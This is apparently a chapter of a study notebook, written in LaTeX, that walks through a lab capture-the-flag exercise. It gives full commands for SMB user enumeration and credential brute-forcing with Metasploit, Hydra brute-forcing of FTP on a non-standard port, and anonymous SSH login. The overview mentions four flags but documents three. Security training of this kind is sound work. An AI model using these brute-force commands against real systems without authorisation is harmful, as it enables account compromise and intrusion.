@@ -1,0 +1,128 @@
+\chapter{CTF 3 --- SMB, FTP, SSH Multi-Flag}
+\label{ctf:ctf3}
+
+\begin{notebox}[Target overview]
+Multi-service CTF with four flags spread across SMB, FTP, and SSH. Each flag
+leaves a hint pointing toward the next service. The chain requires reading flag
+content carefully before moving on.
+\end{notebox}
+
+\section*{Tools Used}
+\begin{itemize}
+  \item \tool{nmap} --- port discovery and service identification
+  \item \tool{Metasploit} --- SMB user enumeration and login brute-force
+  \item \tool{smbclient} --- share access and file retrieval
+  \item \tool{Hydra} --- FTP credential brute-force
+  \item \tool{ssh} --- SSH anonymous login attempt
+\end{itemize}
+
+\section*{Flag 1 --- SMB Share Access}
+
+\begin{termbox}
+# Step 1: Confirm SMB is open
+nmap -sV -p 445 target.ine.local
+
+# Step 2: Enumerate valid SMB users
+msfconsole -q
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS target.ine.local
+run
+
+# Step 3: Brute-force credentials
+use auxiliary/scanner/smb/smb_login
+set RHOSTS target.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+\end{termbox}
+
+Found valid credentials. Connected to the SMB share using \tool{smbclient} with
+the SMBv2/v3 protocol flags required by this target:
+
+\begin{termbox}
+smbclient --option='client min protocol=SMB2' \
+          --option='client max protocol=SMB3' \
+          //target.ine.local/share_name -U found_user
+# Inside smbclient:
+ls
+get flag.txt
+exit
+cat flag.txt
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-12-15_at_6.36.50_AM.png}{smbclient retrieving flag from SMB share using SMBv2/3 options}
+
+\begin{takebox}
+\textbf{Lesson:} When \ic{smbclient} fails silently or hangs, always try the
+\ic{--option='client min protocol=SMB2'} flag. Some targets explicitly reject
+SMBv1 connections. The flag content contained a hint about FTP and specific
+usernames --- read it fully before moving on.
+\end{takebox}
+
+\section*{Flag 2 --- FTP with Custom User List}
+
+Flag 1 contained a hint naming specific usernames. I created a targeted user list
+from those names and used Hydra to brute-force FTP running on a non-standard port.
+
+\begin{termbox}
+# Build user list from names in flag hint
+echo "user1" > /root/user.txt
+echo "user2" >> /root/user.txt
+
+# Brute-force FTP on non-standard port 5554
+hydra -L /root/user.txt \
+      -P /root/Desktop/wordlists/unix_passwords.txt \
+      ftp://target.ine.local -s 5554
+
+# Login with found credentials
+ftp target.ine.local 5554
+ls
+get flag2.txt
+exit
+cat flag2.txt
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-12-15_at_8.13.57_AM.png}{Hydra brute-forcing FTP on port 5554 and finding valid credentials}
+
+\begin{takebox}
+\textbf{Lesson:} Non-standard ports matter. The initial nmap scan showed an unusual
+port that turned out to be FTP. Always scan all ports or at least the top 5000
+(\ic{nmap -p 1-5000}) rather than only the top 1000. Flag 2 contained a hint
+about SSH.
+\end{takebox}
+
+\section*{Flag 3 --- SSH Anonymous Login Banner}
+
+Brute-forcing SSH directly failed --- too many attempts or the account locked. I
+tried anonymous login instead.
+
+\begin{termbox}
+# Try anonymous SSH login
+ssh anonymous@target.ine.local
+
+# Flag appeared inside the SSH warning/banner message on login
+\end{termbox}
+
+The flag was embedded directly in the SSH banner message displayed on connection.
+No password was required --- the \ic{anonymous} account connected and the banner
+contained the flag.
+
+\begin{takebox}
+\textbf{Lesson:} When brute-force fails on SSH, step back and try the simple
+things first. Anonymous login, guest accounts, and banner messages are often
+overlooked. The SSH banner is displayed before authentication completes, so even
+a rejected login can reveal information.
+\end{takebox}
+
+\section*{Flags Summary}
+
+\begin{checkbox}
+\begin{itemize}
+  \item[$\checkmark$] \textbf{Flag 1} --- SMB share access with brute-forced
+        credentials (SMBv2/3 protocol flags required)
+  \item[$\checkmark$] \textbf{Flag 2} --- FTP brute-force using usernames
+        hinted in flag 1, non-standard port 5554
+  \item[$\checkmark$] \textbf{Flag 3} --- SSH anonymous login banner message
+\end{itemize}
+\end{checkbox}
